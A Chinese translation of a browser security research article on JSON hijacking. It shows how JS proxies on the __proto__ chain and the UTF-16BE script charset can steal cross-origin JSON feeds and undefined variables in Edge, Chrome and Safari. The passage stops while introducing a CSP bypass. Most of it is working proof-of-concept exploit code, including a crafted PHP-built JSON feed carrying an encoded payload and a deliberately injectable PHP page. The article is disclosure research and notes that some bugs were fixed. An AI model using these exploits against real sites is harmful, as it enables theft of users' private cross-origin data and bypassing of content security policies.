
# [翻译]现代Web中的JSON劫持

**现代Web中的JSON劫持**

Benjamin Dumke-von der Ehe发现了一个有趣的[跨域窃取数据](https://bbs.kanxue.com/elink@0dcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0S2L8s2m8Z5j5g2)9J5k6h3c8W2i4K6u0r3x3U0l9I4x3#2)9J5c8U0l9J5i4K6u0r3M7r3I4S2K9h3&6Q4x3X3c8@1k6i4S2@1i4K6u0V1j5$3!0F1M7$3W2V1k6i4u0W2k6q4)9J5k6r3S2S2M7X3#2X3N6h3I4Q4x3X3c8S2i4K6u0V1j5%4u0G2M7%4y4Q4x3X3c8V1L8$3#2S2K9h3&6Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0r3)的方法。他使用[JS proxies](https://bbs.kanxue.com/elink@006K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1k6i4k6W2L8r3!0H3k6i4u0Q4x3X3g2E0L8%4A6A6L8r3I4S2i4K6u0W2L8%4u0Y4i4K6u0r3k6h3&6Q4x3V1k6V1L8$3y4K6i4K6u0r3g2$3g2T1i4K6u0r3d9X3q4$3j5g2y4U0M7X3W2H3N6q4)9J5c8W2u0W2k6X3g2J5k6h3&6U0k6g2)9J5c8V1N6D9L8$3u0S2L8q4)9#2k6V1!0T1K9X3g2U0N6s2y4Q4x3V1k6b7M7X3!0^5P5b7`.`.)（JS代理）创建了一个可以窃取未定义的JavaScript变量的`handler`（处理器）。这个问题似乎在Firefox中被修复了，但是我发现了一个新的攻击Edge的方法。虽然Edge似乎不允许对`window.__proto__`赋值，但他们没有考虑`Object.setPrototypeOf`。使用这种方法，我们可以使用代理化的`__proto__`来覆盖`__proto__`的属性。像这样：

```
<script>

Object.setPrototypeOf(__proto__,new Proxy(__proto__,{

 has:function(target,name){

  alert(name);

 }

}));

</script>

<script src="external-script-with-undefined-variable"></script>

<!-- script contains: stealme -->
```

[在Edge上窃取未定义变量的PoC](https://bbs.kanxue.com/elink@f14K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8X3A6K6M7s2u0G2P5s2W2Q4x3V1k6W2k6r3N6W2i4K6g2X3M7s2u0G2P5s2W2Q4y4h3k6#2L8X3c8W2k6X3W2F1k6h3c8Q4y4h3k6$3j5i4u0A6j5h3u0D9k6g2)9#2k6Y4u0W2j5h3c8Q4x3V1j5`.)

如果你的脚本中有包含`stealme`的跨域脚本，那么即便一个变量未被定义，你也会看到该变量的值弹出。

经过进一步的测试，我发现覆盖`__proto__.__proto__`（Edge上的`[object EventTargetPrototype]`）可以实现同样的效果。

```
<script>

__proto__.__proto__=new Proxy(__proto__,{

 has:function(target,name){

  alert(name);

 }

});

</script>

<script src="external-script-with-undefined-variable"></script>
```

[在Edge上窃取未定义变量的PoC（第二种方法）](https://bbs.kanxue.com/elink@2d6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8X3A6K6M7s2u0G2P5s2W2Q4x3V1k6W2k6r3N6W2i4K6g2X3M7s2u0G2P5s2W2Q4y4h3k6#2L8X3c8W2k6X3W2F1k6h3c8Q4y4h3k6$3j5i4u0A6j5h3u0D9k6g2)9#2k6Y4u0W2j5h3c8Q4x3V1k6A6L8X3c8W2P5o6u0Q4x3X3g2Z5N6r3#2D9)

好，所以我们可以窃取跨域数据，但除此之外我们还能做什么？所有主流浏览器都支持脚本中的`charset`属性，我发现UTF-16BE字符集尤为有趣。UTF-16BE是一个多字节字符集，两个字节构成一个字符。例如，如果你的脚本以[`”`开始，[`”`将被视为`0x5b22`而不是`0x5b 0x22`。而`0x5b22`恰好是一个有效的JavaScript变量=]，你能看出其中奥秘吗？

假设Web服务器的给我们的响应包含了一个数组字面量（array literal），并且我们可以控制其中的一部分。我们可以使用UTF-16BE字符集使该数组字面量变成未定义的JavaScript变量，并使用上述技术进行窃取。唯一需要注意的是，组合生成的字符必须形成有效的JavaScript变量。

比如，我们来看看下面的响应：

```
["supersecret","input here"]
```

为了窃取`supersecret`，我们需要插入一个`NULL`字符加两个`a`，由于某种原因，Edge并不将其视为UTF-16BE，除非它包含这些插入的字符。可能Edge会做某种字符集检测，或者也许它会截断响应，`NULL`之后的字符在Edge上不是有效的JavaScript变量。我不确定，但在我的测试中，似乎就是需要一个`NULL`并填充一些字符。参见下面的例子：

```
<!doctype HTML>

<script>

Object.setPrototypeOf(__proto__,new Proxy(__proto__,{

    has:function(target,name){

        alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));

    }

}));

</script>

<script charset="UTF-16BE" src="external-script-with-array-literal"></script>

<!-- script contains the following response: ["supersecret","<?php echo chr(0)?>aa"] -->
```

[在Edge上窃取JSON feeds（馈送）的PoC](https://bbs.kanxue.com/elink@20bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8Y4g2@1k6W2)9J5k6o6p5$3j5X3g2Q4x3V1k6W2k6r3N6W2i4K6g2X3M7%4c8W2j5h3I4Q4y4h3k6B7M7$3!0F1i4K6g2X3k6r3q4@1j5g2)9#2k6Y4N6A6N6r3S2Q4y4h3k6H3M7X3!0^5P5g2)9J5c8X3W2F1k6r3g2^5x3W2)9J5k6i4m8Z5M7l9`.`.)

所以我们像之前一样代理化`__proto__`属性，并且使用UTF-16BE脚本，服务器响应中的数组字面量的第二个位置是`NULL`加两个`a`。接下来解码UTF-16BE编码的字符串，通过移8比特位可以获取到第一个字节，做按位与运算可以获取到第二个字节。结果是弹出`["supersecret","`，可以看出Edge似乎截断了`NULL`之后的响应。这个攻击局限性很大，因为许多字符组合后不会生产有效的JavaScript变量。但窃取少量数据可能还是有用的。

## 在Chrome上窃取feeds

对于Chrome，情况变得更加糟糕。Chrome对包含外来字符集的脚本更加开明。你不需要为了让Chrome使用该字符集而去控制服务器响应。唯一的要求是，像之前一样，字符组合后的要能构成有效的JavaScript变量。为了利用这个“特性”，我们需要另外一个未定义的变量泄露。乍一看Chrome似乎不允许覆盖`__proto__`，然而他们并没有考虑到`__proto__`的深度。

```
<script> 

__proto__.__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{

    has:function f(target,name){

        var str = f.caller.toString();

        alert(str.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));

    }

});

</script>

<script charset="UTF-16BE" src="external-script-with-array-literal"></script>

<!-- script contains the following response: ["supersecret","abc"] -->
```

注意：Chrome 54版本中已将该漏洞修复

[在Chrome 53版本上窃取JSON feeds的PoC](https://bbs.kanxue.com/elink@8d1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8Y4g2@1k6W2)9J5k6o6p5$3j5X3g2Q4x3V1k6U0K9s2u0G2L8h3g2Q4y4h3k6K6N6r3g2S2L8q4)9#2k6X3A6K6L8$3&6Q4y4h3k6V1j5i4c8S2i4K6g2X3N6$3W2@1K9q4)9#2k6Y4m8J5L8%4S2&6i4K6u0r3K9h3&6V1k6i4R3J5i4K6u0W2K9s2c8E0L8l9`.`.)

我们在`__proto__`链上深入5层，并用代理覆盖之，接下来发生的事情很有趣，虽然`name`参数并没有包含我们的未定义变量，但是`caller`（调用者）包含了！它返回一个带有我们变量名的函数！很明显用了UTF-16BE编码，看起来像这样：

```
function 嬢獵灥牳散牥琢Ⱒ慢挢崊
```

啥？所以我们的变量在`caller`中泄漏了。你必须调用`toString`方法才能访问数据，否则Chrome会抛出异常。我尝试通过检查函数的`constructor`（构造器）来进一步利用这个漏洞，看看它是否返回不同的域（也许是Chrome扩展上下文）。当启用了Adblock Plus时，我使用这种方法看到一些扩展代码，但无法利用，因为这些代码看起来只是插入到当前文档中的代码。

在我的测试中，我也用了XML或HTML跨域数据，甚至使用了`text / html` Content-Type（内容类型），然后出现了一个非常严重的信息泄露漏洞。Chrome已经修复了此漏洞。

## 在Safari上窃取feeds

我们也可以在最新版本的Safari中轻松做同样的事。我们只需要少用一个`proto`，并在代理中而不是`caller`中使用“`name`”。

```
<script>

__proto__.__proto__.__proto__.__proto__=new Proxy(__proto__,{

        has:function f(target,name){

            alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));

        }

});

</script>
```

[在Safari上窃取JSON feeds的PoC](https://bbs.kanxue.com/elink@541K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8Y4g2@1k6W2)9J5k6o6p5$3j5X3g2Q4x3V1k6K6j5h3k6S2M7X3W2Q4y4h3k6K6N6r3g2S2L8q4)9#2k6X3A6K6L8$3&6Q4y4h3k6V1j5i4c8S2i4K6g2X3N6$3W2@1K9q4)9#2k6Y4m8J5L8%4S2&6i4K6u0r3)

经过进一步测试，我发现Safari和Edge一样，用`__proto__.__proto__`即可

## 在不使用JS proxies的情况下黑掉JSON feeds

我之前提到主流浏览器都支持UTF-16BE字符集，如何在没有JS proxies的情况下黑掉JSON feeds？首先，你需要控制一些数据，并且必须构建`feed`，以便生成有效的JavaScript变量。获取插入数据入之前的JSON feed的第一部分非常简单，只需输出一个UTF-16BE编码的字符串，该字符串赋给非ASCII变量一个特定的值，然后循环遍历该窗口并检查该值的存在，然后属性名将包含所有插入数据之前的JSON feed。代码如下所示：

```
=1337;for(i in window)if(window[i]===1337)alert(i)
```

然后将该代码编码为UTF-16BE字符串，所以我们实际得到的是代码而不是非ASCII变量。实际上，这就是用`NULL`填充每个字符。要获取注入字符串之后的字符，只需使用增量运算符，并将编码字符串置于窗口属性之后。然后我们调用`setTimeout`并再次循环遍历窗口，但这次检查`NaN`（Not a Number），就能找到我们的编码字符串的变量名。看下面：

```
setTimeout(function(){for(i in window){try{if(isNaN(window[i])&&typeof 

window[i]===/number/.source)alert(i);}}})catch(e){})));++window.a
```

我把代码放在`try catch`里面，因为在检查`isNaN`时`IE`的`window.external`会抛出异常。全部的JSON feed如下：

```
{"abc":"abcdsssdfsfds","a":"<?php echo mb_convert_encoding("=1337;for(i in 

window)if(window[i]===1337)alert(i.replace(/./g,function(c){c=c.charCodeAt(0);return 

String.fromCharCode(c>>8,c&0xff);}));setTimeout(function(){for(i in window){try{if(isNaN(window[i])&&typeof 

window[i]===/number/.source)alert(i.replace(/./g,function(c){c=c.charCodeAt(0);return 

String.fromCharCode(c>>8,c&0xff);}))}catch(e){}}});++window.","UTF-16BE")?>a":"dasfdasdf"}
```

[不用代理黑掉JSON  feeds的PoC](https://bbs.kanxue.com/elink@035K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8G2M7Y4c8K6N6$3W2Y4k6$3g2J5i4K6u0V1L8r3q4T1M7#2)9J5k6h3&6W2N6q4)9J5c8Y4g2@1k6W2)9J5k6o6p5$3j5X3g2Q4x3V1k6%4K9i4c8Z5L8%4g2@1i4K6g2X3M7s2u0G2P5r3W2W2M7#2)9J5c8R3`.`.)

## 绕过CSP （Content Security Policy，内容安全策略）

你可能已经注意到，转换为UTF-16BE 的字符串也会将新行转换为非ASCII变量，这样做甚至可能绕过CSP！ HTML文档将被视为一个JavaScript变量。我们所要做的就是插入一个带UTF-16BE字符集的脚本，该脚本含有编码过的赋值和`payload`（有效载荷），后面跟着注释。这将绕过只允许脚本引用同域资源（大多数的策略）的CSP策略。

HTML文档如下：

```
<!doctype HTML><html>

<head>

<title>Test</title>

<?php

echo $_GET['x'];

?>

</head>

<body>

</body>

</html>
```

注意在`doctype`之后没有新行，如此构造HTML以生成有效的JavaScript，插入点之后的字符不重要，因为我们在后面插了一个单行JavaScript注释，并且新行也会被转换。 请注意，在文档中没有声明字符集，因为`meta`标签属性和引号会破坏JavaScript。 该`payload`看起来如下（注意，为了构造一个有效的变量，`tab`是必须的）：
